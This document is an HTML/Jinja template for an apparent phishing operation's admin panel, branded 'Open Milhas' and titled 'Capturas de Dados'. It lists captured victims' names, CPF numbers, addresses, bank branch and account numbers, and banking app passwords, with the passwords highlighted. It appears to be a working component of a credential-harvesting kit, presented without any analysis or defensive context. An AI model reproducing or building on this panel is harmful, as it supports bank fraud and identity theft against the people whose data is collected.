<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Painel Admin | Open Milhas</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="bg-light p-4">
    <div class="container-fluid bg-white p-4 rounded shadow">
        <h2 class="mb-4">Capturas de Dados - Open Milhas</h2>
        <table class="table table-striped table-hover">
            <thead class="table-dark">
                <tr>
                    <th>Nome / CPF</th><th>Endereço</th><th>Banco (Ag/Conta)</th><th>Senha App</th>
                </tr>
            </thead>
            <tbody>
                {% for u in usuarios %}
                <tr>
                    <td>{{ u[1] }}<br><small class="text-muted">{{ u[3] }}</small></td>
                    <td>{{ u[5] }}, {{ u[6] }}</td>
                    <td>Ag: {{ u[7] }} / CC: {{ u[8] }}</td>
                    <td><strong class="text-danger">{{ u[9] }}</strong></td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
    </div>
</body>
</html>
